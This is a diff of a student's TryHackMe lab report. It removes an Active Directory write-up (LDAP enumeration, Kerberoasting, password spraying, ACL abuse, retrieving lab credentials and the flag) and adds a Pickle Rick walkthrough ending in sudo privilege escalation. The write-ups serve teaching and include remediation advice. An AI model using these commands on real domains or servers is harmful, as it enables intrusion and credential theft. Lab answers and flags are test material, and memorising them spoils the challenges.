@@ -1,278 +1,296 @@
-# TryHackMe — Operation Endgame (Active Directory Penetration Test)
+# TryHackMe - Pickle Rick Walkthrough
 
-**Name:** NUR ALEA BATRISYIA BINTI MOHD FADZLY
-**Class / Section:** L01-B03
-**Course:** BCT
-**Date:** 28/11/2026
+**Name:** NUR ALEA BATRISYIA BINTI MOHD FADZLY  
+**Class:** L01-B03  
+**Course:** BCT  
+**Date:** 28 November 2026
 
-> **Scope & authorization:** All testing was performed against the TryHackMe room
-> *Operation Endgame*, a deliberately vulnerable lab machine reached only through my
-> own TryHackMe OpenVPN connection. No third-party, production, or unauthorized system
-> was touched.
-
----
-
-## 1. Target Setup (Victim)
-
-| Item | Value |
-|------|-------|
-| Platform | TryHackMe — Operation Endgame v1.7 |
-| Target IP | `10.48.158.84` |
-| Hostname | `AD` (`ad.thm.local`) |
-| Role | Domain Controller |
-| Domain | `thm.local` (NetBIOS: `THM`) |
-| OS | Windows Server 2019 (Build 17763 x64) |
-| Hosting | AWS EC2 `t3a.medium`, ap-south-1a |
-| Key services | DNS 53, Kerberos 88, LDAP 389, SMB 445, RDP 3389 |
-| SMB signing | True |
-
-![Target machine](images/00-target-machine.png)
+**Platform:** TryHackMe  
+**Room:** Pickle Rick  
+**Room URL:** https://tryhackme.com/room/picklerick
 
 ---
 
-## 2. Attacker Host (Own Host)
+## 1. Target Information
 
-| Item | Value |
-|------|-------|
-| Machine / OS | Kali Linux on WSL2 (host: DESKTOP-B3HQ7HK) |
-| Shell | ZSH |
-| VPN | OpenVPN — TryHackMe Asia Pacific (Mumbai) |
-| VPN interface | `tun0` — `192.168.182.210/18` |
-| Tools used | nmap, ldapsearch, NetExec (nxc), hashcat, targetedKerberoast, FreeRDP 3, smbclient, Internet Explorer (on target) |
+| Item | Details |
+|---|---|
+| Target Name | Pickle Rick |
+| Target IP | 10.49.167.193 |
+| Operating System | Ubuntu Linux |
+| Web Server | Apache 2.4.41 |
+| Port 22 | SSH |
+| Port 80 | HTTP |
 
-**VPN setup:**
+## 2. Attacker Machine
+
+| Item | Details |
+|---|---|
+| Machine | TryHackMe AttackBox |
+| Operating System | Kali Linux |
+| Attacker IP | 10.49.188.191 |
+| Tools Used | Nmap, Firefox, Linux Commands |
+
+## 3. Methodology Used
+
+The following methodologies were used:
+
+1. Reconnaissance
+2. Network Scanning
+3. Website Enumeration
+4. Credential Discovery
+5. Command Execution
+6. Privilege Escalation
+7. Ingredient Retrieval
+
+## 4. Step-by-Step Walkthrough
+
+### Step 1: Network Scanning
+
+I used Nmap to identify open ports and running services on the target machine.
+
+**Command:**
+
 ```bash
-sudo apt install -y openvpn
-cp "/mnt/d/Users/Nitro RTX/Downloads/<thm-config>.ovpn" ~/thm.ovpn
-sudo openvpn ~/thm.ovpn     # wait for "Initialization Sequence Completed"
-export ip=10.48.158.84
-echo "10.48.158.84 thm.local ad.thm.local" | sudo tee -a /etc/hosts
+nmap -sC -sV 10.49.167.193
 ```
 
-**Troubleshooting:** The first scan showed every port as *filtered*. This was because the VPN
-was not connected yet (THM showed *Not connected*, virtual IP `0.0.0.0`). The host only
-appeared "up" because `-Pn` skips host discovery. After I connected OpenVPN inside WSL,
-`tun0` came up and the AD ports showed as open.
+**Results:**
 
-![VPN not connected](images/01-vpn-not-connected.png)
-![Nmap — all ports filtered before VPN](images/02-nmap-filtered.png)
-![tun0 up and AD ports open](images/03-vpn-tun0-nmap-open.png)
-
----
-
-## 3. Methodology
-
-1. **Reconnaissance**: port scan to identify the host as an AD Domain Controller.
-2. **Enumeration**: anonymous LDAP to build a domain user list.
-3. **Credential access**: Kerberoasting as Guest, offline cracking, password spraying.
-4. **Privilege escalation (AD)**: abuse of an ACL (GenericWrite) for targeted Kerberoasting.
-5. **Lateral movement**: RDP as a low-privileged user; local enumeration for secrets.
-6. **Domain compromise**: hardcoded Domain Admin credentials, then the admin share (C$) and the flag.
-
-**Attack chain:**
-```
-Anonymous LDAP ──► Guest Kerberoast ──► CODY_ROY (cracked)
-      ──► Password reuse ──► ZACHARY_HUNT
-      ──► GenericWrite ──► Targeted Kerberoast ──► JERRI_LANCASTER (cracked)
-      ──► RDP ──► C:\Scripts\syncer.ps1 ──► SANFORD_DAUGHERTY (Domain Admin)
-      ──► C$ ──► flag
-```
-
----
-
-## 4. Findings
-
-### Finding 1: Anonymous LDAP Bind → Domain User Enumeration (Medium)
-
-- **Location:** LDAP `389/tcp` on the Domain Controller.
-- **Description:** The DC accepts unauthenticated (anonymous) LDAP queries, so anyone can list domain user objects.
-- **Exploitation:**
-```bash
-ldapsearch -x -H ldap://$ip -b "DC=thm,DC=local" "(objectClass=user)" sAMAccountName \
-  | grep sAMAccountName | awk '{print $2}' > users.txt
-sed -i '/requesting:/d' users.txt
-```
-→ **333** account names were recovered with no credentials.
-- **Impact:** This gives an attacker a ready-made target list for Kerberoasting and password spraying.
+| Port | Service | Version |
+|---|---|---|
+| 22 | SSH | OpenSSH 8.2p1 |
+| 80 | HTTP | Apache 2.4.41 |
 
 **Evidence:**
-![LDAP user enumeration](images/04-ldap-user-enum.png)
 
----
+![Nmap Scan](images/nmap-scan.png)
 
-### Finding 2: Kerberoasting via Guest Account → CODY_ROY (High)
+### Step 2: Website Enumeration
 
-- **Location:** Kerberos `88/tcp`, LDAP `389/tcp`.
-- **Description:** The built-in **Guest** account is enabled with an empty password. Any authenticated
-  user can request a TGS ticket for an account that has a Service Principal Name (SPN). That ticket is
-  encrypted with the account's password hash, so it can be cracked offline.
-- **Exploitation:**
-```bash
-nxc ldap $ip -u guest -p '' --kerberoasting cody.hash
-hashcat -m 13100 cody.hash /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 cody.hash --show
-```
-→ This returned an RC4 (etype 23) TGS hash for `CODY_ROY`, who is a member of **Remote Desktop Users**.
-Hashcat cracked it in about **1 second**.
-- **Credential recovered:** `CODY_ROY : MKO)mko0`
-- **Impact:** The Guest account alone is enough to get a valid domain user password.
+I accessed the target website using Firefox.
+
+URL: `http://10.49.167.193`
+
+I inspected the HTML source code and discovered a hidden username.
+
+**Username:** `R1ckRul3s`
 
 **Evidence:**
-![Kerberoast as Guest](images/05-kerberoast-guest.png)
-![Hashcat — cracked](images/06-hashcat-cody-cracked.png)
-![CODY_ROY password](images/07-cody-password.png)
 
----
+![Website](images/website.png)
 
-### Finding 3: Password Reuse → ZACHARY_HUNT (High)
+![Username Source](images/username-source.png)
 
-- **Description:** The cracked password was weak, so I tested it against the other users. A second
-  account uses the exact same password.
-- **Exploitation:**
-```bash
-nxc smb $ip -u users.txt -p 'MKO)mko0' --continue-on-success | grep '[+]'
-nxc smb $ip -u ZACHARY_HUNT -p 'MKO)mko0'
-```
-- **Observation:** The spray against the LDAP-derived list only found `CODY_ROY`, because
-  `ZACHARY_HUNT` was not in the anonymously enumerated list. The only "Zachary" in it was
-  `ZACHARY_HAMMOND`. Testing the account directly confirmed it was valid. This shows anonymous
-  LDAP gave an incomplete user list. RID brute-forcing as Guest
-  (`nxc smb $ip -u guest -p '' --rid-brute`) would have produced a complete list.
-- **Credential recovered:** `ZACHARY_HUNT : MKO)mko0`
-- **Impact:** One cracked password compromised several accounts.
+### Step 3: Inspecting robots.txt
+
+I accessed the robots.txt file to find additional information.
+
+URL: `http://10.49.167.193/robots.txt`
+
+The file revealed a password clue:
+
+**Password Clue:** `Wubbalubbadubdub`
 
 **Evidence:**
-![Password spray (SMB)](images/08-password-spray-smb.png)
-![ZACHARY_HUNT valid](images/09-zachary-valid.png)
 
----
+![Robots TXT](images/robots-txt.png)
 
-### Finding 4: Excessive ACL (GenericWrite) → Targeted Kerberoasting → JERRI_LANCASTER (High)
+### Step 4: Accessing Rick Portal
 
-- **Description:** `ZACHARY_HUNT` has **GenericWrite** over the user `JERRI_LANCASTER`
-  (an attack path BloodHound shows). GenericWrite lets the attacker write a fake SPN to the
-  target account, request a TGS for it, and then remove the SPN. This makes any user Kerberoastable.
-- **Exploitation:**
-```bash
-git clone https://github.com/ShutdownRepo/targetedKerberoast ~/tk
-python3 ~/tk/targetedKerberoast.py -d thm.local -u ZACHARY_HUNT -p 'MKO)mko0' \
-  --dc-ip $ip --request-user JERRI_LANCASTER -o jerri.hash
-hashcat -m 13100 jerri.hash /usr/share/wordlists/rockyou.txt
-hashcat -m 13100 jerri.hash --show
-```
-→ Hashcat cracked the hash in under 3 seconds.
-- **Credential recovered:** `JERRI_LANCASTER : lovinlife!`
-- **Impact:** A misconfigured permission let a normal user take over another user's account.
+I used the discovered username and password clue to log in to the Rick Portal.
+
+After successful login, I gained access to the Command Panel.
 
 **Evidence:**
-![Targeted Kerberoast](images/10-targeted-kerberoast.png)
-![Hashcat — cracked](images/11-hashcat-jerri-cracked.png)
-![JERRI_LANCASTER password](images/12-jerri-password.png)
 
----
+![Rick Portal](images/portal-login.png)
 
-### Finding 5: Hardcoded Domain Admin Credentials in Script (Critical)
+### Step 5: Command Execution
 
-- **Location:** `C:\Scripts\syncer.ps1` on the Domain Controller.
-- **Access:**
+I executed Linux commands through the Command Panel.
+
+**Command:**
+
 ```bash
-xfreerdp3 /u:JERRI_LANCASTER /p:'lovinlife!' /d:thm.local /v:$ip /cert:ignore /dynamic-resolution
+whoami
 ```
-- **Restricted desktop bypass:** The RDP session was restricted. `Win + R` was captured by
-  the host, and there was no direct access to cmd or Explorer. I bypassed this by opening
-  **Internet Explorer** and browsing to `file:///C:/Scripts/syncer.ps1`, which opened the
-  script in Notepad.
-- **Content:**
-```powershell
-$Username = "SANFORD_DAUGHERTY"
-$Password = ConvertTo-SecureString "RESET_ASAP123" -AsPlainText -Force
-Sync-ADObject -Object "DC=thm,DC=local" -Source "ad.thm.local" -Destination "ad2.thm.local" -Credential $Credential
+
+**Output:**
+
+```text
+www-data
 ```
-- **Credential recovered:** `SANFORD_DAUGHERTY : RESET_ASAP123`
-- **Impact:** A plaintext Domain Admin password could be read by a low-privileged user.
+
+This showed that the commands were executed under the web server account.
+
+Next, I listed the files in the current directory.
+
+**Command:**
+
+```bash
+ls
+```
+
+I discovered a file named:
+
+`Sup3rS3cretPickl3Ingred.txt`
+
+I used the `less` command to read the file.
+
+**Command:**
+
+```bash
+less Sup3rS3cretPickl3Ingred.txt
+```
+
+**First Ingredient:** `mr. meeseek hair`
 
 **Evidence:**
-![RDP as JERRI_LANCASTER](images/13-rdp-jerri.png)
-![syncer.ps1 hardcoded credentials](images/14-syncer-hardcoded-creds.png)
 
----
+![Command Execution](images/command-execution.png)
 
-### Finding 6: Domain Compromise → Flag (Critical)
+![First Ingredient](images/first-ingredient.png)
 
-- **Verification:**
+### Step 6: Finding the Second Ingredient
+
+I inspected the clue file.
+
+**Command:**
+
 ```bash
-nxc smb $ip -u SANFORD_DAUGHERTY -p 'RESET_ASAP123'
+less clue.txt
 ```
-→ `(Pwn3d!)`: local admin rights on the Domain Controller.
-- **Flag retrieval:** I first tried remote command execution with
-  `nxc ... -x 'type ...'`. It ran via wmiexec, but the output could not be retrieved.
-  I switched to downloading the file directly from the admin share:
+
+The clue instructed me to look around the file system for the other ingredient.
+
+I checked the home directory.
+
 ```bash
-smbclient //$ip/C$ -U 'thm.local\SANFORD_DAUGHERTY%RESET_ASAP123' \
-  -c 'cd Users\Administrator\Desktop; ls; get flag.txt.txt flag.txt'
-cat flag.txt
+ls -la /home
 ```
-- **Flag:** `THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}`
-- **Impact:** Full compromise of the domain.
+
+I discovered a directory named `rick`.
+
+Next, I listed its contents.
+
+```bash
+ls -la /home/rick
+```
+
+A file named `second ingredients` was found.
+
+I used the following command to read it:
+
+```bash
+less "/home/rick/second ingredients"
+```
+
+**Second Ingredient:** `jerry tear`
 
 **Evidence:**
-![SANFORD_DAUGHERTY Pwn3d](images/15-sanford-pwned.png)
-![wmiexec — no output](images/16-wmiexec-no-output.png)
-![Flag](images/17-flag.png)
 
----
+![Home Directory](images/home-directory-enumeration.png)
 
-## 5. Credentials Summary
+![Second Ingredient](images/second-ingredient.png)
 
-| Account | Password | Obtained via | Privilege |
-|---------|----------|--------------|-----------|
-| Guest | *(empty)* | Default / enabled | Authenticated domain access |
-| CODY_ROY | `MKO)mko0` | Kerberoast + hashcat | Remote Desktop Users |
-| ZACHARY_HUNT | `MKO)mko0` | Password reuse | GenericWrite on JERRI_LANCASTER |
-| JERRI_LANCASTER | `lovinlife!` | Targeted Kerberoast + hashcat | RDP to DC |
-| SANFORD_DAUGHERTY | `RESET_ASAP123` | Hardcoded in `syncer.ps1` | **Domain Admin** |
+### Step 7: Privilege Escalation
 
----
+I checked the sudo permissions of the current account.
 
-## 6. Limitations
+**Command:**
 
-- I used a public walkthrough (see References) as a guide for the overall attack path. All commands were run and verified on my own instance, and I solved several differences from the walkthrough myself: a VPN that was not connected, an incomplete LDAP user list, a restricted RDP desktop, and wmiexec output failure.
-- BloodHound collection was not run in this session. The GenericWrite edge was confirmed by successfully exploiting it.
-- AS-REP roasting and other paths (e.g. ADCS on `443`, CA `thm-LABYRINTH-CA`) were not assessed.
-- I did not attempt persistence or full credential dumping (NTDS.dit / DCSync). The objective was the flag.
+```bash
+sudo -l
+```
 
----
+The output showed:
 
-## 7. Interpretation & Analysis
+```text
+User www-data may run the following commands:
+(ALL) NOPASSWD: ALL
+```
 
-- **Anonymous LDAP + Guest (Findings 1–2):** Two small misconfigurations together give an
-  unauthenticated attacker a user list *and* a way to request Kerberos tickets.
-- **Weak / reused passwords (Findings 2–4):** Every cracked password was in `rockyou.txt` and broke in
-  seconds. RC4 tickets make Kerberoasting fast.
-- **ACL abuse (Finding 4):** Excessive AD permissions are hard to see without tooling and turn one user
-  into another.
-- **Secrets in scripts (Finding 5):** This was the decisive step. A plaintext Domain Admin password on the
-  DC itself meant the whole domain fell.
+This indicated that the www-data account could execute commands with root privileges without a password.
 
-**Recommended remediations:**
+I then accessed the root directory.
 
-| Finding | Fix |
-|---------|-----|
-| Anonymous LDAP | Disable anonymous binds (`dSHeuristics`); restrict null sessions. |
-| Guest Kerberoast | Disable the Guest account; use gMSAs or 25+ char random passwords for SPN accounts; disable RC4 (AES only). |
-| Password reuse | Enforce a strong password policy, block breached/common passwords (e.g. Azure AD Password Protection), and monitor for spraying (event 4771/4625 spikes). |
-| GenericWrite ACL | Audit ACLs regularly with BloodHound/PingCastle; remove unnecessary write rights; alert on SPN changes (event 5136). |
-| Hardcoded creds | Never store credentials in scripts; use gMSA, Windows Credential Manager, or a secrets vault; rotate SANFORD_DAUGHERTY's password. |
-| Domain compromise | Tiered admin model; limit Domain Admin membership; use LAPS and Protected Users group. |
+**Command:**
 
----
+```bash
+sudo ls -la /root
+```
 
-## 8. References
+I discovered a file named `3rd.txt`.
 
-- TryHackMe — Operation Endgame room — https://tryhackme.com/
-- Walkthrough used as a guide — https://edbertsumicad.medium.com/tryhackme-operation-endgame-9f5fb4429c2f
-- MITRE ATT&CK T1558.003 Kerberoasting — https://attack.mitre.org/techniques/T1558/003/
-- MITRE ATT&CK T1110.003 Password Spraying — https://attack.mitre.org/techniques/T1110/003/
-- MITRE ATT&CK T1552.001 Credentials in Files — https://attack.mitre.org/techniques/T1552/001/
-- targetedKerberoast — https://github.com/ShutdownRepo/targetedKerberoast
-- NetExec — https://github.com/Pennyw0rth/NetExec
+**Evidence:**
+
+![Sudo Permissions](images/sudo-permissions.png)
+
+![Root Directory](images/root-directory.png)
+
+### Step 8: Finding the Third Ingredient
+
+I used the following command to read the file.
+
+```bash
+sudo less /root/3rd.txt
+```
+
+The output revealed the third ingredient.
+
+**Third Ingredient:** `fleeb juice`
+
+**Evidence:**
+
+![Third Ingredient](images/third-ingredient.png)
+
+## 5. Final Answers
+
+All three ingredients were successfully discovered.
+
+| No. | Ingredient |
+|---|---|
+| 1 | mr. meeseek hair |
+| 2 | jerry tear |
+| 3 | fleeb juice |
+
+**Room Status:** Completed  
+**Points Earned:** 90
+
+**Evidence:**
+
+![Room Completed](images/room-completed.png)
+
+## 6. Security Findings
+
+During this challenge, I identified the following security issues:
+
+1. **Information Disclosure:** A username was exposed in the HTML source code.
+2. **Information Disclosure:** A password clue was exposed through robots.txt.
+3. **Remote Command Execution:** The web portal allowed commands to be executed on the target server.
+4. **Misconfigured Sudo Permissions:** The www-data account had unrestricted sudo permissions, allowing privilege escalation.
+
+## 7. Recommended Security Improvements
+
+- Avoid exposing sensitive information in HTML source code.
+- Do not store password clues in publicly accessible files.
+- Restrict command execution through web applications.
+- Apply the principle of least privilege.
+- Review sudo permissions regularly.
+
+## 8. Conclusion
+
+In conclusion, this TryHackMe challenge helped me understand the basic process of penetration testing.
+
+I learned how to perform network scanning using Nmap, inspect website source code, identify exposed information, execute Linux commands and investigate privilege escalation.
+
+The challenge also demonstrated how security misconfigurations can allow attackers to gain higher privileges.
+
+The Pickle Rick room was successfully completed after retrieving all three required ingredients.
+
+## 9. References
+
+- TryHackMe Pickle Rick: https://tryhackme.com/room/picklerick
+- Nmap Documentation: https://nmap.org/book/man.html
+- Kali Linux Documentation: https://www.kali.org/docs/
